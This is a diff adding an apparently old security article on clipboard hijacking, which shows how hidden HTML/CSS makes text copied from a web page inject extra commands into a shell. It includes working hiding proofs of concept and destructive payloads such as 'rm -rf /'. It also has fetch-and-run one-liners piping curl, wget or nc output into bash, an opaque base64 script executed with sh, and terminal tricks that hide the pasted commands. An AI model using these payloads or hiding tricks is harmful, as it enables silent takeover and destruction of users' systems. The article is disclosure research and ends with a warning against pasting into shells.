@@ -1,0 +1,241 @@
+User iteraction based exploitation: WYSINWYC (What you see is not what you copy)
+
+When working with computers you know if there is or not a reliable and
+deterministic way to exploit them, ineed when working with humans there's
+no certezza. Technical people often prefear to stay technical and avoid
+humans. This is infact our first article witch need direct human 
+iteraction to work.
+
+The presented technique relay on a special type of "rich text" 
+copy where the apparently inncuos payload is pasted in a different
+context able to parse it. This is especially true, but definitely not
+limited to, online how-to.
+
+The core concept of the attack is that the displayed text (and thus the
+data the user thinks to have copied) is different from what the browser
+have in realy copied.
+
+Recently "clipboard poisoning" attacks have arised using Flash (one of
+the few good candidates able to set the clipboard, other than VBScript,
+as it doesn't follow browser raccomendations and implementations wich
+disable JavaScript read and write access to the Clipboard object on
+documents coming from unsafe XXX like the internets.) and this convinto
+us to publish the present, two years old, discovery and research.
+
+Do you have even copy/pasted something from your brower to your shell?
+Did you felt that as an innocuos process? Then our scope in this 
+pubblication is to show how dangerous and silent is.
+
+Mounting the attack presented is easy but could have different level 
+of results. It has to be carefully developed, toughted, planned and 
+executed to get prime levels of p0wn. Also the specific "how-to" 
+example is somehow limited to geeks and techinal people who uses unix
+systems.
+
+Social engineering in any of it's forms can be used to lower the bar
+and render a specific attack more effective. 
+
+Consider anyway that the concept is wider and applies to any "rich-data"
+who changes it's context thanks to the user. It's not limited to 
+browsers and shells but our very own example is.
+
+The basic implementation makes no use of JS but only HTML and CSS. 
+A more weaponized POC that is presented makes use of JS to better handle
+different browsers but gracefully degrades to HTML only if JS is 
+disabled or extensions like NoScript are used.
+
+Preface is over, let's go with the interesting part.
+
+Technical attacker-side details: hiding.
+
+uname <span style="display: none;">>/dev/null;xterm;uname </span> -a
+
+This rapresents the smallest POC to demonstrate the technique and only
+works with Firefox. As you can imagine, seen the prologue, the browser
+will only render "uname -a" to the user but the clipboard (both the 
+"Xerox copy" (tm) of X11/Xorg, select and paste, and the standard 
+CTRL+C/CTRL+V mechanism) will effectively contain the hidden "xterm" 
+command.
+
+When such data is pasted into a shell the hidden command will extecute
+together with the others.
+
+The POC that follows is a better implementation and takes in merit the
+implementation details scaturiti from a deeper research once it was 
+realized that the attack was extremly interesting (it was succesfully
+tested on many paranoid and security addicted friends with good success
+ratios).
+
+<script><!--
+if (navigator.appName == "Opera") {
+ document.write('<span style="display: block; float: left;">uname <span style="color: white;">\\</span></span><span style="display: block; float: left; background: transparent; color: transparent; white-space: no-wrap; overflow: hidden; width: 0px; height: 0px;">2&gt;&1 &>/dev/null && touch ciao && uname \\</span><span style="display: block; float: left;">&nbsp;-a; </span><span style="display: block; white-space: no-wrap;">     </span><span style="display: block; clear: both;"></span>');
+} else {
+ document.write('<span style="display: block; float: left;">uname </span><span style="display: block; float: left; background: transparent; color: transparent; white-space: no-wrap; overflow: hidden; width: 0px; height: 0px;">2&gt;&1 &>/dev/null && touch ciao && uname </span><span style="display: block; float: left;">&nbsp;-a; </span><span style="display: block; white-space: no-wrap;">     </span><span style="display: block; clear: both;"></span>');
+}
+--></script>
+<noscript>
+<!-- Let's hope it's not Opera -->
+<span style="display: block; float: left;">uname </span><span style="display: block; float: left; background: transparent; color: transparent; white-space: no-wrap; overflow: hidden; width: 0px; height: 0px;">2&gt;&1 &>/dev/null && touch ciao && uname </span><span style="display: block; float: left;">&nbsp;-a; </span><span style="display: block; white-space: no-wrap;">     </span><span style="display: block; clear: both;"></span>
+</noscript>
+
+JS has only a small role for Browser and OS detection (as the 
+implementation can be extended to take care of Windows too as any other
+OS). The main part is the CSS "universal" hiding stye, with the only 
+little exception for Opera that needs special attentions.
+
+Technical victim-side details: introduction and terminal details.
+
+Now that we know that there's a nice and faesable user iteraction based
+way to send our data/commands to user applications and the "copy" part
+is tuned to be as hidden as possible (a simple paste in a text editor
+will completely reveal the evil intentions) it's the turn of the "paste"
+part.
+
+Stealthness can be obtained in two different ways: small payload (who 
+will notice 20 chars or less) in the pasted text and by visive tricks 
+or by the combination of boths methods.
+
+Payloads will be presented first then the victim-side hiding part.
+
+Remember that this technique is not limited to shell/terminal but 
+examples are build against the scenario of a user iteraction from a 
+"rich copy" to it's root/user shell.
+
+Technical victim-side details: small offline and two stage payloads.
+
+A list of real life example follows, just to give you an idea.
+
+Small commands:
+	rm -rf /
+	del /F /S /Q * # windows
+	/opt/custom/app abuse_my_functionality
+	echo "*" > ~/.rhost
+	...
+
+Remote storage over http
+
+	GET example.com|bash
+	wget -q example.com -O-|bash
+	curl -s example.com|bash
+	echo -en "GET /\n\n"|nc example.com 80|bash
+	...
+
+The shortest that comes to my mind is "GET ush.it|sh" (13 chars).
+
+Other remote storage fetch methods:
+	nc example.com
+	dig AXFR evil.com @evil-dns-with-53-tcp # since zone transfers use TCP
+	sslclient
+	...
+
+Just use your immagination to figure out the best payload to inject
+seen the network topology and size.
+
+As you can see small commands are limited in terms of flexibility and
+remote fetch/exec can be made useless by network protections (egress 
+filtering, my-work-is-grep ids) and configuration issues (missing 
+routing, machine offline, personal firewall, etc).
+
+Small commands normally doesn't work very well offline and network ones
+can bypass the above protections (like for the dns thingie). Also small
+injection payloads can be used to mout two stage attacks where the big
+part is stored online.
+
+Network storage potentially leave more tracks on the victim's computer
+and network and can help track back the attacker while a stealth 
+selfcontained command could be very hard to track (was the forum or
+the apache.org howto who p0wned me?).
+
+This technique allows you to sent a lot of data to the client and big
+selfcontained paylaods up to >100k have been succesfully tested, can 
+you imagine how mutch logic can you stuff into it?
+
+Of course it's possible to send multirow text but remember to calibrate 
+carefully newlines as unexpected results could arise.
+
+Technical victim-side details: selfcontained and wrapped/packed payloads
+
+This is the beast, a complete, fully featured and demo oriented payload
+that demonstrates the ability to carry complex self-contained attacks.
+
+It makes use of a number of utilities like "echo", "uudecode", "base64",
+"tar", "" and "".
+
+Please consider that much less is needed to successfully own a system
+but the scope of the demo is to entratain you.
+
+echo -en "begin-base64 600 whathappened.sh.gz\nH4sICIWWukcAA3doYXRoYXBwZW5lZC5zaACtWvtTGzkS/p2/QuflbpPcskYP\nv4qi6gghjzoIFGR3k1rnhsEe8Bz2DBmbsL5l//eT+tNMSw4s5C42Vn/davV8\n0ujRY/PdX9pnedE+S+eTtWw0KcVGVojWcFPrX83mjKTenO3s7LS21k52j/f2\n3ibHeyeH+z+9e3P4dvv0tyotxpW4FRdVdiVa/3rWsniejUVr3hbiWVu0L5xl\ndL0QG9Zo3xvnQv1gTu+IlrzfPiUK619UfRFC3hngw+MDKBvgYO/kZOfV3smv\nmx+3W0Ik9iXufSX2PSxE27qJ4X1Ot+49LJxwyIdzcSk0XSBJYq+hfbftn31/\n70K33YVsMTxt3KjJUPws7F/7FldxgdriiatJrJcYOvp2zIdJ2/45I1VYoyt+\nSJ4kT63XI16P9WoFAyhpAP+/l7tu4mh/9cu1cZ9hgda1XmO2cfwYPT5CHGvV\nFkdga+wXx49rvhyHu3hwWXvGvfj6MYxf3yJCOD8UFpi480OranjnZ1g8EYd2\nrt/YT2E/mf2M7ecv4ilN+fbdn+ja+hvMTfSIRNJ2q+xrX64NtaO7245MIpbu\nAqyHiFvYKA8FicOt2nyP2MQVsWt8ibimGZdwTO5iw2XtGXMS32LGfcso4fwx\nbv58cTAMizaOgR8TmsTJrd3JC7f52rfdep+07Y57W97JKI7f8YfPQx2z2/rw\nvpnnDhJ3UgD6F4j5ZZaELrdo4Y6JNiEbt11HcSeJO0faApeDpz2D3LliUfmI\nQX6USzgIXb9B3HuyChyuw4I6eOsOTXJuzmMq/aHZuAnvh841h6aDCe5XglWJ\nQ9Pvy3xo3iZP/6fzsIc954GMwr5ccHSBcwWfJaBIXF7Qpi0S71uXAbR9ozpX\nSASZ3KR0y8pNQLq39Zu63fYf329KEnBjUUGDUecKj7uJX/a8X6dSd3e5SaLc\nLBP0l4ikTpGaxMgRqPMd8b3r4oa10N1tkp22v2vWcps4w2PTnJjw4KHld8/S\nSzBbvlxTt22sqPbd6+kWq8ntEg+vpZUsa/OBVeKnPs1vnvnO2w1fPX487zGA\n1vL1c36FmfzzDNpP9WCmB9OcJ7mfo3b0aPyS5sYLqqjn7a2j6WYtJq39+Cn7\nIO0V1upPJyuYxzO27s19+fzj0vnHZfPfIJmP+pvsHv709t32+u/fNSPwj49/\n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\nXLS/K/62gIsGFw0uGlw0uGhw0eCiwUWDiwYXDS4aXDS4GHAx4GLAxYCLARcD\nLgZcjJ8jfpKAiwEXAy4GXAy4GHAx4GLAxYCLARcDLh1w6YBLB1w64NIBlw64\ndMClAy4dcOn4GeunLLh0wKUDLh1w6YBLB1w64NIBlw64dMGlCy5dcOmCSxdc\nuuDSBZcuuHTBpQsuXXDp+vXjFxC4dMGlCy5dcOmCSxdcuuDSA5ceuPTApQcu\nPXDpgUsPXHrg0gOXHrj0wKUHLj1w6fnV7JczuPTApQcuPXDpgUsfXPrg0geX\nPrj0waUPLn1w6YNLH1z64NIHlz649MGlDy59cOn7vcVvLuDSB5c+uAzAZQAu\nA3AZgMsAXAbgMgCXAbgMwGUALgNwGYDLAFwG4DIAlwG4DMBl4Hc6v9XVe129\n2W02X38v62+/l7UprU31b0/Nryj88wp9He9M9G08mepvypz1wGOqcF+oOaP7\nOq35Xaj+spsyfvG0/u2Sf9mEjt81Xx6+fZf88ubFu9fbHa+93nvz6vW7bbm5\ntXZ+XYwWeVkI9x+s5Uw8eSp+F8c7b18cHiRvfzp4vne8vbnlfm+bZuJX0VqP\nqlpiw5rXpfi4JcblSjPvuiXc13GtqE78dVusq5ZrVGRbAv+sGnlsiT/WzstK\nUI9sg7wQp/Psk5DCDv+pa7gm/M+3yZsX26ee/aZYj3/mPd1iP4zBKf977/rv\nzS/A6xzs4x/uX3VvRmJjP2ztx+wrmk9dc9d524EDf3W+Gc8iWqGnv1Jwp57F\nJLzzwc775P32Hf8/vMEXDFw/3OH6YSO4ovV198D9/3EwnO4ip3XVh9WqD66K\nZlvy8tXKnQgnJbs9f8jtt0VWzcTG2YUbYT+R14O2boA3zu+ofdnUXmTlLFtU\nS+sTjXLrNzagz62/Y0on7xv0wQZY5O6b4dbhTZGNrWphc9uH9973YWtrPnVf\nvcvOVkv8bU2c7O/tHQVddf9sLeCy+eM61W6tuSWw9l9EL3wnfy4AAA==\n====\n" > whathappened.sh.gz.uuencode; uudecode whathappened.sh.gz.uuencode; gzip -f -d whathappened.sh.gz; sh whathappened.sh 2>&1 &> /dev/null; echo -en "\033[0m"; echo -en  "$i ";      curl -sI http://www.nellablog.com/gallery/$i/image/01.jpg | grep "^HTTP/"; 
+
+On the other side selfcontained attacks alone are pretty visible since
+you'll see huge blobs of text being typed in the terminal.
+
+Technical victim-side details: hiding on the terminal
+
+To carry a lot of data while remaining stealth it's necessary to use
+other tricks as promised before.
+
+On windows:
+	@echo off
+
+Hide the input in linux with stty:
+	stty -echo
+
+Hide the input in linux with read -s
+	echo "ls -la" | perl -e '$cmd=<STDIN>;chop($cmd);print("read -sn".length($cmd)." a;\n".$cmd."\$a;\n");'
+	read -sn6 a;
+	ls -la$a;
+
+The above is a simlple and smart (read -sn6 a; ls -la$a;).
+
+Hide the output in linux with redirects:
+	echo -en 2>&1 &>/dev/null;
+
+Of course you can redirect the output to Kalapampur.
+
+Hide the output in linux with terminal color escape sequences:
+
+echo -en "\033[40m\033[30mAAA";
+
+Now we can mix them together to get a killer routine that possibly will 
+works on different operative systems and enviroments.
+
+stty -echo;echo -en "\033[40m\033[30mAAA";
+
+Users that uses a colored PS1 have an escape sequence that will reset
+our escape sequence so the best is to disable PS1.
+
+stty -echo;PS1="";echo -en "\033[40m\033[30mAAA";
+ls 2>&1 &>/dev/null;
+
+It could be a good idea to restore the PS1 after the attack.
+
+stty -echo;
+a=$PS1;PS1="";echo -en "\033[40m\033[30mAAA";ls 2>&1 &>/dev/null;stty echo;PS1=$a;
+
+A better alternative that produces better output exist.
+
+stty -echo;
+a=$PS1;PS1="";echo -en "\033[40m\033[30mAAA";ls 2>&1 &>/dev/null;stty echo;
+PS1=$a;
+
+Technical victim-side details: considerations and demo.
+
+Many aspects have been touched as user iteraction needs precision to
+work on tech-savy humans. This is the best we could come out that 
+doesn't cade in the uninteresting phising/please-click-on-the-exe 
+category. The number and complexity of elements in play require special
+attantion when crafting the attack.
+
+The very nice part is that no comuter vulnerability is required and
+this will probably work until the whole internet userbase gets his
+brain upgrded to version 2.0. This is expected to happen for Never GMT.
+
+Conceps involved are: user iteraction, trust in what you think are 
+doing, cross-contexts actions. Technical details exposed are: browser
+"copy" trickery and hiding, terminal "paste" trickery and hiding, online
+and offline payloads.
+
+Summarizing: never copy and paste something directly from an untrusted
+source to an executable context. Never ever.
+
+We really hope you enjoyed the reading. Have a good day.
